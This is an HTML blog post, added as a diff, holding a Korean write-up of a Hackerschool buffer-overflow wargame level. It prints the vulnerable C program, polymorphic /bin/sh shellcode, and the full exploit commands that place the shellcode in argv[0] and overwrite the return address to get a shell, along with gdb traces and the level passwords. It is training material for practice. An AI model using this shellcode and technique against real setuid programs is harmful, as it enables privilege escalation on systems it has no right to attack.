@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[Wargame] 해커스쿨 BoF LEVEL8 (orge -> troll) : check argc</title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" type="text/css">
+
+  <!-- Font -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link href='//spoqa.github.io/spoqa-han-sans/css/SpoqaHanSans-kr.css' rel='stylesheet' type='text/css'>
+  <link href="https://fonts.googleapis.com/css?family=Ubuntu+Mono" rel="stylesheet">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS Feed for Writeup oriented CTF for fun and profit" href="/feed.xml" />
+  <!-- Begin Jekyll SEO tag v2.3.0 -->
+<title>[Wargame] 해커스쿨 BoF LEVEL8 (orge -&gt; troll) : check argc | Writeup oriented CTF for fun and profit</title>
+<meta property="og:title" content="[Wargame] 해커스쿨 BoF LEVEL8 (orge -&gt; troll) : check argc" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="id = orge pw = timewalker" />
+<meta property="og:description" content="id = orge pw = timewalker" />
+<link rel="canonical" href="http://localhost:4000/2015-11-13/hackerschool-BoF-stage-8/" />
+<meta property="og:url" content="http://localhost:4000/2015-11-13/hackerschool-BoF-stage-8/" />
+<meta property="og:site_name" content="Writeup oriented CTF for fun and profit" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2015-11-13T22:30:00+09:00" />
+<script type="application/ld+json">
+{"name":null,"description":"id = orge pw = timewalker","author":null,"@type":"BlogPosting","url":"http://localhost:4000/2015-11-13/hackerschool-BoF-stage-8/","publisher":null,"image":null,"headline":"[Wargame] 해커스쿨 BoF LEVEL8 (orge -&gt; troll) : check argc","dateModified":"2015-11-13T22:30:00+09:00","datePublished":"2015-11-13T22:30:00+09:00","sameAs":null,"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2015-11-13/hackerschool-BoF-stage-8/"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+
+  <!-- Google Analytics -->
+
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', '', 'auto');
+ga('send', 'pageview');
+
+</script>
+
+
+
+</head>
+
+<body>
+  <div class="content-container">
+    <header>
+  <div class="header-small">
+    <a href="http://localhost:4000">Writeup oriented CTF for fun and profit</a>
+  </div>
+</header>
+<div class="post">
+  <div class="post-title">[Wargame] 해커스쿨 BoF LEVEL8 (orge -> troll) : check argc</div>
+  <span class="post-date">
+    <time>13 Nov 2015</time>
+  </span>
+  <div class="post-tag">
+    <ul>
+      
+      <li>
+        <a href="http://localhost:4000/tags#bof">
+          <span>bof</span>
+        </a>
+      </li>
+      
+      
+    </ul>
+  </div>
+
+  <ul>
+  <li>id = orge</li>
+  <li>pw = timewalker</li>
+</ul>
+
+<!--more-->
+
+<h2 id="1-문제--trollec">1. 문제 : trolle.c</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - troll
+        - check argc + argv hunter
+*/</span>
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="k">extern</span> <span class="kt">char</span> <span class="o">**</span><span class="n">environ</span><span class="p">;</span>
+
+<span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+
+        <span class="c1">// here is changed
+</span>        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"argc must be two!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// egghunter
+</span>        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+                <span class="n">memset</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">47</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'\xbf'</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"stack is still your friend.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// check the length of argument
+</span>        <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">48</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"argument is too long!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+
+        <span class="c1">// buffer hunter
+</span>        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">40</span><span class="p">);</span>
+
+        <span class="c1">// one more!
+</span>        <span class="n">memset</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>이번에 추가된 제약사항은</p>
+
+<ul>
+  <li><code class="highlighter-rouge">argc==2</code> 즉, argument 는 하나만 사용해야 함.</li>
+  <li><code class="highlighter-rouge">argv[1]</code> 까지 0으로 밀어버린다.</li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="c1">// here is changed
+</span>        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"argc must be two!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="p">...</span>
+        <span class="c1">// one more!
+</span>        <span class="n">memset</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
+</code></pre></div></div>
+
+<h2 id="2-shellcode-를-명령어에-올려라">2. shellcode 를 명령어에 올려라</h2>
+
+<p>그렇다면 가능한 공격방법은 무엇일까 ? 
+처음에는 방법이 있을까 했는데… 아무래도 <code class="highlighter-rouge">argv[0]</code> 인 명령어에 shellcode 를 올려놓고, 이를 이용할 수 밖에 없을 것 같다.</p>
+
+<p>shellcode를 <code class="highlighter-rouge">argv[0]</code> 에 올려놓고 사용할 수 있는 방법을 좀 고민하였다. 처음에는 command injection 형태로 시도하다가 그냥 symbolic link 를 걸어서 사용하였다.</p>
+
+<p>그런데, 기존에 사용하던 shellcode 를 이름으로 실행 파일을 symbolic link 를 거는데 자꾸 에러가 나는거다.  shellcode 안에 <code class="highlighter-rouge">\x2f</code>가 <code class="highlighter-rouge">\</code> 이므로 파일 이름이 될 수 없어서 발생하는 에러라는거다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ln <span class="nt">-s</span> troll2 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'</span><span class="sb">`</span>
+ln: cannot create symbolic link <span class="sb">`</span>j
+                                  Xfh-pRjhh/bash/binRQS<span class="s1">' to `troll2'</span>: No such file or directory
+</code></pre></div></div>
+
+<p>그렇다면 <code class="highlighter-rouge">\x2f</code> 가 들어가 있지 않은 shellcode 를 구해야한다.<br />
+<a href="http://farlight.org/index.html?file=platforms/lin_x86/shellcode/13312.c&amp;name=linux/x86---/bin/sh---polymorphic---shellcode---48---bytes&amp;credit=Jonathan---Salwan&amp;id=44483&amp;isAdvisory=0">Polymorphic Shellcode /bin/sh - 48 bytes by Jonathan Salwan</a></p>
+
+<p>다행히 compile 해서 실행하는데, 잘 동작하는거다. 이걸로 try 해보자.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+
+ Title: 	Polymorphic Shellcode /bin/sh - 48 bytes
+ Author: 	Jonathan Salwan
+ Mail:		submit [!] shell-storm.org 
+
+ 	! DataBase of shellcode : http://www.shell-storm.org/shellcode/
+
+
+ Original Informations
+ =====================
+
+ Disassembly of section .text:
+
+  08048060  &lt;.text&gt;:
+  8048060:	 31 c0                	 xor    %eax,%eax
+  8048062:	 50                   	 push   %eax
+  8048063:	 68 2f 2f 73 68       	 push   $0x68732f2f
+  8048068:	 68 2f 62 69 6e       	 push   $0x6e69622f
+  804806d:	 89 e3                	 mov    %esp,%ebx
+  804806f:	 50                   	 push   %eax
+  8048070:	 53                   	 push   %ebx
+  8048071:	 89 e1                	 mov    %esp,%ecx
+  8048073:	 99                   	 cltd   
+  8048074:	 b0 0b                	 mov    $0xb,%al
+  8048076:	 cd 80                	 int    $0x80
+
+
+*/</span>
+
+<span class="cp">#include "stdio.h"
+</span>
+<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>	 <span class="s">"</span><span class="se">\xeb\x11\x5e\x31\xc9\xb1\x32\x80</span><span class="s">"</span>
+					<span class="s">"</span><span class="se">\x6c\x0e\xff\x01\x80\xe9\x01\x75</span><span class="s">"</span>
+					<span class="s">"</span><span class="se">\xf6\xeb\x05\xe8\xea\xff\xff\xff</span><span class="s">"</span>
+					<span class="s">"</span><span class="se">\x32\xc1\x51\x69\x30\x30\x74\x69</span><span class="s">"</span>
+					<span class="s">"</span><span class="se">\x69\x30\x63\x6a\x6f\x8a\xe4\x51</span><span class="s">"</span>
+			 		<span class="s">"</span><span class="se">\x54\x8a\xe2\x9a\xb1\x0c\xce\x81</span><span class="s">"</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Polymorphic Shellcode - length: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+    <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">shellcode</span><span class="p">)();</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// milw0rm.com [2009-08-11]
+</span></code></pre></div></div>
+
+<h2 id="3-공격실패">3. 공격실패</h2>
+
+<p>이번 문제와 동일하게 stack 을 확인해서 선택한 <code class="highlighter-rouge">LR</code> 은 <code class="highlighter-rouge">0xbffffd54</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage8-1.png" alt="img" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xbffffd36:      <span class="s2">""</span>
+0xbffffd37:      <span class="s2">"i686"</span>
+0xbffffd3c:      <span class="s2">"/home/orge/"</span>, <span class="s1">'\220'</span> &lt;repeats 50 <span class="nb">times</span><span class="o">&gt;</span>, <span class="s2">"ë</span><span class="se">\0</span><span class="s2">21^1É±2</span><span class="se">\2</span><span class="s2">00l</span><span class="se">\0</span><span class="s2">16 </span><span class="se">\0</span><span class="s2">01</span><span class="se">\2</span><span class="s2">00é</span><span class="se">\0</span><span class="s2">01uöë</span><span class="se">\0</span><span class="s2">05èê   2ÁQi00tii0cjo</span><span class="se">\2</span><span class="s2">12äQT</span><span class="se">\2</span><span class="s2">12â</span><span class="se">\2</span><span class="s2">32±</span><span class="se">\f</span><span class="s2">Î</span><span class="se">\2</span><span class="s2">01"</span>
+0xbffffdaa:      <span class="s1">'A'</span> &lt;repeats 44 <span class="nb">times</span><span class="o">&gt;</span>, <span class="s2">"Tý ¿"</span>
+0xbffffddb:      <span class="s2">""</span>                            
+</code></pre></div></div>
+
+<p>gdb 로 debugging를 해보면 shellcode 로 jump 하는 것까지 정상적으로 되는데, 이상하게 실제 실행을 하면 계속 fault 가 나는 것이다.  그렇다면.. gdb 실행환경과 실제 동작환경에서 stack 이 다르게 잡히면서 <code class="highlighter-rouge">LR</code> 이 달라지는 것이 아닐까 ?</p>
+
+<h2 id="4-실행환경과-gdb-실행-시-명령어-위치-확인">4. 실행환경과 GDB 실행 시 명령어 위치 확인</h2>
+
+<p>소스 맨 앞에 <code class="highlighter-rouge">argv[0]</code> 위치를 찍는 함수를 넣고 gdb와 실제 실행환경에서 실행하여 값을 확인하여 보자.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="n">printf</span><span class="p">(</span><span class="s">"argv[0] : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>     
+</code></pre></div></div>
+
+<h3 id="41-실제-실행환경--0xbffffcfd">4.1 실제 실행환경 =&gt; <code class="highlighter-rouge">0xbffffcfd</code></h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>/home/orge/<span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*50 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'</span><span class="sb">`</span>           
+argv[0] : 0xbffffcfd
+argc must be two!  
+</code></pre></div></div>
+
+<h3 id="42-gdb-실행-환경---0xbffffd3c">4.2 GDB 실행 환경  =&gt; <code class="highlighter-rouge">0xbffffd3c</code></h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gdb /home/orge/<span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*50 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'</span><span class="sb">`</span>    
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type <span class="s2">"show copying"</span> to see the conditions.
+There is absolutely no warranty <span class="k">for </span>GDB.  Type <span class="s2">"show warranty"</span> <span class="k">for </span>details.
+This GDB was configured as <span class="s2">"i386-redhat-linux"</span>...
+<span class="o">(</span>gdb<span class="o">)</span> r <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "A"*44 + "\x3b\xfb\xff\xbf"'</span><span class="sb">`</span>
+Starting program: /home/orge/ë^1É±2l éuöëèê   2ÁQi00tii0cjoäQTâ±
+                                                                Î <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "A"*44 + "\x3b\xfb\xff\xbf"'</span><span class="sb">`</span>
+argv[0] : 0xbffffd3c
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span class="p">;</span>û ¿
+...
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xbffffd36:      ""
+0xbffffd37:      "i686"
+0xbffffd3c:      "/home/orge/", '\220' &lt;repeats 50 times&gt;, "ë\021^1É±2\200l\016 \001\200é\001uöë\005èê   2ÁQi00tii0cjo\212äQT\212â\232±\fÎ\201"
+0xbffffdaa:      'A' &lt;repeats 44 times&gt;, ";û ¿"
+---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
+0xbffffddb:      ""
+0xbffffddc:      ""   
+</code></pre></div></div>
+
+<h3 id="42-비교">4.2 비교</h3>
+
+<p>다시 곰곰히 생각을 해보니깐 gdb 실행시에 실행한 다음의 stack 사용을 동일하겠지만 gdb 실행하기 위한 command line arugment 받는 부분은 환경이 서로 다를 수도 있으니깐 다를 수도 있을 것 같은 생각이 든다.</p>
+
+<p>좀 이상한 것은 gdb 쓰는 경우가 stack 을 많이 써서 stack pointer 가 더 높게 설정이 되어 있을 것 같은데 실행명령어 경우가 더 높게 잡혀있는 것은 아직은 잘 모르겠다.</p>
+
+<h2 id="5-공격">5. 공격</h2>
+
+<p>실제 exploit 을 위해서는 명령실행환경에서의 <code class="highlighter-rouge">agv[0]</code>의 위치를 정확하게 알아야 한다.</p>
+
+<h3 id="51-위치-출력하도록-코드-빌드">5.1 위치 출력하도록 코드 빌드</h3>
+
+<p>앞에서도 확인을 했지만 현재는 운이 좋아 소스를 빌드하여 위치를 출력하도록하여 알아낼 수 있다. 절대 path 로 실행하는지, 상대 path 로 실행하는지에 따라서 명령어 string 길이가 다르기 때문에 위치가 서로 다른 것을 알 수 있다.</p>
+
+<h4 id="511-절대-path-실행">5.1.1 절대 path 실행</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>/home/orge/<span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*50 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'</span><span class="sb">`</span>  
+argv[0] : 0xbffffcfd
+argc must be two!  
+</code></pre></div></div>
+
+<h4 id="512-상대-path-실행">5.1.2 상대 path 실행</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./<span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*50 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'</span><span class="sb">`</span> 
+argv[0] : 0xbffffd18
+argc must be two! 
+</code></pre></div></div>
+
+<h3 id="52-공격">5.2 공격</h3>
+
+<p>혼동이 없도록 절대 path 로 실행한 경우을 이용하고 <code class="highlighter-rouge">argv[0]</code> 앞부분에는 <code class="highlighter-rouge">/home/org/</code> 값이 들어갈테니깐 그 뒤에 NOP 를 충분히 넣고 그 중간에 <code class="highlighter-rouge">$pc</code> 가 떨어지도록하면 공격 가능할 것 같다.</p>
+
+<p>아래 stack memory 는 <strong>GDB 실행해서 잡은 것</strong>이므로 <strong>실제로는 이보다 <code class="highlighter-rouge">0x40</code> 정도 stack 이 위에 잡히게 되는 것</strong>을 고려하자.</p>
+
+<p><img src="https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage8-3.png" alt="img" /></p>
+
+<p>그래서 선택한 값은 <code class="highlighter-rouge">0xbffffd04</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>/home/orge/<span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*50 + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'</span><span class="sb">`</span> <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "A"*44 + "\x04\xfd\xff\xbf"'</span><span class="sb">`</span>  
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAýü ¿
+bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>507<span class="o">(</span>orge<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>507<span class="o">(</span>orge<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>508<span class="o">(</span>troll<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>508<span class="o">(</span>troll<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>507<span class="o">(</span>orge<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="6-다음-단계-정보">6. 다음 단계 정보</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>507<span class="o">(</span>orge<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>507<span class="o">(</span>orge<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>508<span class="o">(</span>troll<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>508<span class="o">(</span>troll<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>507<span class="o">(</span>orge<span class="o">)</span>
+
+bash<span class="nv">$ </span>my-pass
+euid <span class="o">=</span> 508
+aspirin  
+</code></pre></div></div>
+
+<h2 id="7-의문점">7. 의문점</h2>
+
+<h3 id="71-stack-차이">7.1 Stack 차이</h3>
+
+<p>실제실행과 gdb 사용 시 stack 잡히는 것이 다른 것은 아직 정확하게 잘 모르겠다.</p>
+
+<h3 id="72-소스-빌드-못하고-gdb-로만-agv0-주소-파악">7.2 소스 빌드 못하고, gdb 로만 <code class="highlighter-rouge">&amp;agv[0]</code> 주소 파악</h3>
+
+<p><code class="highlighter-rouge">&amp;argv[0]</code> 값을 직접 알아낼 수 없고, gdb  만 사용할 수 있는 경우라면 ?</p>
+
+<p>NOP 를 크게 넣어준다면 두 경우의 stack 위치 차이에 NOP 사이에 들어온다면 gdb 로만 위치 확인하고도 동작하지 않을까 ?</p>
+
+<p>몇 번 해봤는데.. 잘 안 된다. T_T;</p>
+
+<h3 id="73-agv0-에-바로-jump-하는-경우">7.3 <code class="highlighter-rouge">&amp;agv[0]</code> 에 바로 jump 하는 경우</h3>
+
+<p>절대 경로로 실행한 경우에 <code class="highlighter-rouge">&amp;agv[0]</code> 값에는  <code class="highlighter-rouge">/home/orge/</code> 값이 있을텐데 이로 바로 jump 를 한 경우에 gdb 에서 fault 가 나는데, 실제 실행 시에는 정상적인 동작을 한다. 왜 일까 ??</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/100i 0xbffffd3c
+0xbffffd3c:     das
+0xbffffd3d:     push   <span class="nv">$0x2f656d6f</span>
+0xbffffd42:     outsl  %ds:<span class="o">(</span>%esi<span class="o">)</span>,<span class="o">(</span>%dx<span class="o">)</span>
+0xbffffd43:     jb     0xbffffdac
+0xbffffd45:     gs
+0xbffffd46:     das
+0xbffffd47:     nop
+0xbffffd48:     nop
+0xbffffd49:     nop
+0xbffffd4a:     nop
+0xbffffd4b:     nop
+...
+</code></pre></div></div>
+
+
+
+  <!-- Disqus -->
+  
+  <div class="post-disqus">
+      <section id="disqus_thread"></section>
+      <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables */
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//humb1ec0ding.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  </div>
+  
+
+</div>
+
+
+    <!-- Documents about icons are here: http://fontawesome.io/icons/ -->
+<div class="footer">
+  <hr />
+  <div class="footer-link">
+    
+	
+	
+	
+	
+
+    
+    <a href="https://twitter.com/humb1ec0ding"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    
+
+    
+    <a href="https://github.com/humb1ec0ding"><i class="fa fa-github" aria-hidden="true"></i></a>
+    
+	
+	
+	
+	
+
+    
+	
+	
+	
+	
+	
+	
+	
+	
+
+    
+
+    
+
+    
+    <a href="mailto:humblecoding@gmail.com"><i class="fa fa-envelope" aria-hidden="true"></i></a>
+    
+
+  </div>
+  © 2017 humb1ec0ding. All rights reserved.
+</div>
+
+  </div>
+</body>
+</html>
